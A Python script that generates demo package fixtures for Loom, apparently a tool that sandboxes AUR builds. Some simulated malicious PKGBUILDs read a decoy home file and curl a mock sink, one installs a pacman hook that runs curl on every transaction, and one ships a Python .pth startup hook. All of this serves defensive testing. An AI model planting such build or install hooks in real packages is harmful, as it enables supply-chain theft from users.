#!/usr/bin/env python3
"""Generate Loom demo fixtures.

Run it with no arguments to (re)materialise every package fixture under this
directory:  python3 demo/fixtures/genfix.py

Every "malicious" build here is a SIMULATION for Loom's own defensive
evaluation. None of it is real malware:

  * to model a credential read (FR-3.2), a build tries to read a decoy file
    the demo plants at $HOME/.loom-canary — never a real credential path;
  * to model exfiltration / install-time network use (FR-3.4), a build tries
    to open a connection to the demo's LOCAL sink and sends a fixed marker
    string, never the contents of any file;
  * to model persistence (placement policy), a build installs a pacman hook
    that likewise only pings the local sink.

Loom's sandbox denies and logs each attempt; that denial is the whole point.
The probes are deliberately inert so the fixtures are not copyable attacks.
"""
import os

F = os.path.dirname(os.path.abspath(__file__))
# The mock AUR rewrites @AUR@ to its own base URL and @SHA256:file@ to the
# pinned hash of the served source. The build sees a normal https URL.
SINK = "@AUR@/sink"


def write(name, ver, rel, maint, desc, body, files=None, sources=None, sums=None,
          arch=("any",), depends=(), makedepends=(), install=None, dirname=None):
    files = files or {}
    sources = list(sources if sources is not None else list(files.keys()))
    sums = list(sums if sums is not None else ["SKIP"] * len(sources))
    d = os.path.join(F, name, dirname or f"{ver}-{rel}")
    os.makedirs(d, exist_ok=True)
    q = lambda xs: " ".join(f"'{x}'" for x in xs)
    lines = [f"# Maintainer: {maint} <{maint}@aur>", f"pkgname={name}", f"pkgver={ver}",
             f"pkgrel={rel}", f'pkgdesc="{desc}"', f"arch=({q(arch)})",
             f'url="https://example.org/{name}"', "license=('MIT')"]
    if depends:
        lines.append(f"depends=({q(depends)})")
    if makedepends:
        lines.append(f"makedepends=({q(makedepends)})")
    if install:
        lines.append(f"install={install}")
    lines.append(f"source=({q(sources)})")
    lines.append(f"sha256sums=({q(sums)})")
    open(os.path.join(d, "PKGBUILD"), "w").write("\n".join(lines) + "\n\n" + body.strip() + "\n")
    for fn, content in files.items():
        open(os.path.join(d, fn), "w").write(content)
    si = [f"pkgbase = {name}", f"\tpkgdesc = {desc}", f"\tpkgver = {ver}",
          f"\tpkgrel = {rel}", f"\turl = https://example.org/{name}"]
    if install:
        si.append(f"\tinstall = {install}")
    si += [f"\tarch = {a}" for a in arch] + ["\tlicense = MIT"]
    si += [f"\tmakedepends = {x}" for x in makedepends]
    si += [f"\tdepends = {x}" for x in depends]
    si += [f"\tsource = {x}" for x in sources]
    si += [f"\tsha256sums = {x}" for x in sums]
    si += ["", f"pkgname = {name}", ""]
    open(os.path.join(d, ".SRCINFO"), "w").write("\n".join(si))


def echo_script(fn, msg):
    return {fn: f"#!/bin/sh\necho '{msg}'\n"}


def install_bin(n):
    return f'package() {{\n  install -Dm755 "$srcdir/{n}" "$pkgdir/usr/bin/{n}"\n}}'


# A build step that PROBES a blocked resource, for the sandbox to deny.
# Reads a decoy canary (not a credential path) and pings the local sink with a
# fixed marker. Both are denied under confinement; both are inert.
def probe(pkg, stage):
    return f'''  # --- simulated payload (inert probe; see demo/fixtures/genfix.py) ---
  # 1) attempt to read the user's home (Loom denies this: FR-3.2)
  cat "$HOME/.loom-canary" 2>/dev/null && echo "PROBE-READ-HOME-OK" || true
  # 2) attempt to reach the network (Loom denies this: FR-3.4)
  curl -fsS -m 3 "{SINK}?pkg={pkg}&stage={stage}&marker=loom-probe" 2>/dev/null || true
'''


# ---------------------------------------------------------------- benign packages

# libweft: a dependency, so `install hello-loom` exercises dependency resolution.
write("libweft", "1.0", "1", "alice", "Tiny shell helper library used by hello-loom",
      'package() {\n  install -Dm644 "$srcdir/weft.sh" "$pkgdir/usr/lib/libweft/weft.sh"\n}',
      files={"weft.sh": "weft_greet() { printf 'woven by loom: %s\\n' \"$1\"; }\n"})

# hello-loom: a small C package, built reproducibly, with a benign install hook.
write("hello-loom", "1.2", "1", "alice", "Hello world in C, built reproducibly",
      '''build() {
  gcc $CFLAGS $LDFLAGS -o hello-loom hello.c
}

check() {
  ./hello-loom | grep -q 'Hello from Loom'
}

package() {
  install -Dm755 hello-loom "$pkgdir/usr/bin/hello-loom"
  install -Dm644 /dev/null "$pkgdir/usr/share/doc/hello-loom/.keep"
}''',
      files={
          "hello.c": '#include <stdio.h>\nint main(void) {\n    puts("Hello from Loom: verified by k-of-n independent rebuilders.");\n    return 0;\n}\n',
          "hello-loom.install": 'post_install() {\n  echo "hello-loom $1 installed"\n}\npost_upgrade() {\n  post_install "$1"\n}\n',
      },
      sources=["hello.c"], arch=("x86_64", "aarch64"), depends=("libweft",),
      makedepends=("gcc",), install="hello-loom.install")

# fastmover: benign, but published only hours ago → temporal quarantine (FR-7.1).
write("fastmover", "0.9", "1", "dave", "A fast-moving tool released hours ago",
      install_bin("fastmover"), files=echo_script("fastmover", "fastmover 0.9: brand new"))

# tlsprobe: a security release that must bypass quarantine (FR-7.3). Remote
# source, pinned by hash and served by the mock AUR's upstream.
write("tlsprobe", "2.0.1", "1", "erin", "TLS endpoint prober (security release)",
      'package() {\n  install -Dm755 "$srcdir/tlsprobe-2.0.1.sh" "$pkgdir/usr/bin/tlsprobe"\n}',
      sources=["tlsprobe-2.0.1.sh::@AUR@/upstream/tlsprobe-2.0.1.sh"],
      sums=["@SHA256:tlsprobe-2.0.1.sh@"])

# ---------------------------------------------------------------- attack simulations

# orphan-tool: benign 1.0 by bob; 1.1 by mallory after an orphan adoption
# (ADV-2). The 1.1 build probes home + network (ADV-5). Loom detects the
# maintainer change (FR-8.5) *and* the sandbox denies the probes.
write("orphan-tool", "1.0", "1", "bob", "Small utility, long maintained by bob",
      install_bin("orphan-tool"), files=echo_script("orphan-tool", "orphan-tool 1.0"))
write("orphan-tool", "1.1", "1", "mallory", "Small utility, long maintained by bob",
      "build() {\n" + probe("orphan-tool", "build") + "}\n\n" + install_bin("orphan-tool"),
      files=echo_script("orphan-tool", "orphan-tool 1.1"))

# npm-helper: compromised maintainer account injects a build-time download,
# like the Atomic Arch `npm install` in a PKGBUILD (ADV-3/ADV-5). Denied by
# the no-network sandbox (FR-3.4).
write("npm-helper", "2.4", "1", "carol", "Node helper scripts",
      install_bin("npm-helper"), files=echo_script("npm-helper", "npm-helper 2.4"))
write("npm-helper", "2.5", "1", "carol", "Node helper scripts",
      "build() {\n" + probe("npm-helper", "npm-install") + "}\n\n" + install_bin("npm-helper"),
      files=echo_script("npm-helper", "npm-helper 2.5"))

# forcepush-lib: history rewritten in place (TeamPCP-style, ADV-3, FR-8.4).
# The rewritten release also plants a pacman hook (placement policy, audit A4).
write("forcepush-lib", "3.1", "1", "frank", "Library whose history gets rewritten",
      'package() {\n  install -Dm644 "$srcdir/fp.sh" "$pkgdir/usr/lib/forcepush-lib/fp.sh"\n}',
      files={"fp.sh": "fp_version() { echo 3.1; }\n"})
write("forcepush-lib", "3.1", "1", "frank", "Library whose history gets rewritten",
      '''package() {
  install -Dm644 "$srcdir/fp.sh" "$pkgdir/usr/lib/forcepush-lib/fp.sh"
  install -Dm644 "$srcdir/zz-fp.hook" "$pkgdir/usr/share/libalpm/hooks/zz-fp.hook"
}''',
      files={
          "fp.sh": "fp_version() { echo 3.1; }\n",
          # The hook only pings the local sink with a marker: inert, but the
          # placement policy blocks any package that installs an alpm hook.
          "zz-fp.hook": ("[Trigger]\nOperation = Install\nType = Package\nTarget = *\n"
                         "[Action]\nWhen = PostTransaction\n"
                         f"Exec = /bin/sh -c 'curl -fsS -m 3 \"{SINK}?pkg=forcepush-lib-hook&marker=loom-probe\"'\n"),
      },
      dirname="3.1-1-rewrite")

# pth-inject: ships a Python .pth startup hook (the LiteLLM vector, ADV-4/A4).
# The .pth line is inert (prints a marker) but the placement policy blocks it.
write("pth-inject", "1.0", "1", "heidi", "Python package with a startup hook",
      '''package() {
  install -Dm644 "$srcdir/loomdemo.pth" "$pkgdir/usr/lib/python3.13/site-packages/loomdemo.pth"
}''',
      files={"loomdemo.pth": "import sys; sys.stderr.write('loom-probe: .pth executed at interpreter start\\n')\n"})

# divergent-bin: source that does not build reproducibly (embeds a timestamp),
# so independent rebuilders disagree and support never reaches k (ASM-5, E3).
write("divergent-bin", "1.0", "1", "ivan", "Tool that embeds build time (non-reproducible)",
      '''build() {
  echo "#!/bin/sh" > divergent-bin
  echo "echo built-at-$(date +%s%N)-$RANDOM" >> divergent-bin
  chmod +x divergent-bin
}

package() {
  install -Dm755 "$srcdir/divergent-bin" "$pkgdir/usr/bin/divergent-bin"
}''')

# upstream source for tlsprobe (served by the mock AUR, pinned by hash).
up = os.path.join(F, "upstream")
os.makedirs(up, exist_ok=True)
open(os.path.join(up, "tlsprobe-2.0.1.sh"), "w").write(
    '#!/bin/sh\n# tlsprobe 2.0.1 — security release fixing CVE-2026-31337\n'
    'echo "tlsprobe 2.0.1: connection to $1 uses TLS 1.3"\n')

print("fixtures written under", F)
